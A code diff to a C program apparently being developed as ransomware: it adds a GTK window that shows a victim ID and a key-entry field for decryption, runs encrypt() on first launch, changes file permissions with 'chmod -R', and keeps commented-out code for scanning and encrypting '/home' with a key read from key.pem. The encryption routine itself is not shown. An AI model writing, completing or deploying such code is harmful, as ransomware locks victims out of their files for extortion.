@@ -7,54 +7,6 @@
 #include <gtk/gtk.h>
 
 
-GtkWidget *g_lbl_id, *form;
-int main(int argc, char *argv[])
-{
-    GtkBuilder      *builder;
-    GtkWidget       *window;
-
-    gtk_init(&argc, &argv);
-
-    builder = gtk_builder_new();
-    gtk_builder_add_from_file (builder, "window_main.glade", NULL);
-
-    window = GTK_WIDGET(gtk_builder_get_object(builder, "window_main"));
-    gtk_builder_connect_signals(builder, NULL);
-    // get pointers to the two labels
-    g_lbl_id = GTK_WIDGET(gtk_builder_get_object(builder, "lbl_id"));
-    gtk_label_set_text(GTK_LABEL(g_lbl_id), "Hello, world!");
-    form = GTK_WIDGET(gtk_builder_get_object(builder, "key"));
-
-    g_object_unref(builder);
-
-    gtk_widget_show(window);
-    gtk_main();
-
-    return 0;
-}
-
-
-void on_b_decrypt_clicked()
-{
-    //static unsigned int count = 0;
-    char str_count[30] = {0};
-    //GladeXML *xml = glade_xml_new("TextEntry.glade", NULL, NULL);
-    //orm = glade_xml_get_widget(xml, "key");
-    //count++;
-    printf("simple click\n");
-    printf("%s\n", gtk_entry_get_text(GTK_ENTRY(form)));
-    //sleep(2);
-    //gtk_label_set_text(GTK_LABEL(g_lbl_count), "Hello, world!");
-    //gtk_label_set_text(GTK_LABEL(g_lbl_count), str_count);
-}
-
-// called when window is closed
-void on_window_main_destroy()
-{
-    gtk_main_quit();
-}
-
-
 bool first(){
     FILE *k = fopen("public.pem", "rb");
     if(k == NULL)
@@ -105,7 +57,7 @@ bool existKey(){
     return true;
 }
 
-bool getKey(unsigned char *key){
+/*bool getKey(unsigned char *key){
     FILE *f = fopen("key.pem", "rb");
     if(f == NULL)
         return false;
@@ -120,12 +72,12 @@ bool getKey(unsigned char *key){
     fclose(f);
     return true;
 }
-
-void decrypt(){
+*/
+void decrypt(unsigned char *key){
     key_id ki;
     extractId(&ki);
-    unsigned char key[3000];
-    getKey(key);
+    //unsigned char key[3000];
+    //getKey(key);
     //newKey(key);
     //scanAndCrypt("/home", key, true);
     unsigned char d[32];
@@ -137,3 +89,51 @@ void decrypt(){
     system("chmod -R 555 .");
     encrypt();
 }*/
+
+
+GtkWidget *g_lbl_id, *form;
+
+int main(int n, char *args[n])
+{
+
+    system("chmod -R 555 .");
+    if(first()){
+        encrypt();
+    }
+
+    GtkBuilder *builder;
+    GtkWidget  *window;
+
+    gtk_init(&n, &args);
+
+    builder = gtk_builder_new();
+    gtk_builder_add_from_file (builder, "window_main.glade", NULL);
+
+    window = GTK_WIDGET(gtk_builder_get_object(builder, "window_main"));
+    gtk_builder_connect_signals(builder, NULL);
+    // get pointers to the two labels
+    g_lbl_id = GTK_WIDGET(gtk_builder_get_object(builder, "lbl_id"));
+    char id[100]; key_id ki; extractId(&ki);
+    sprintf(id, "ID: %d", ki.id);
+    gtk_label_set_text(GTK_LABEL(g_lbl_id), id);
+    form = GTK_WIDGET(gtk_builder_get_object(builder, "key"));
+
+    g_object_unref(builder);
+
+    gtk_widget_show(window);
+    gtk_main();
+
+}
+
+
+void on_b_decrypt_clicked()
+{
+    system("chmod -R 555 .");
+    //decrypt(gtk_entry_get_text(GTK_ENTRY(form)));
+}
+
+void on_window_main_destroy()
+{
+    system("chmod -R 755 .");
+    gtk_main_quit();
+}
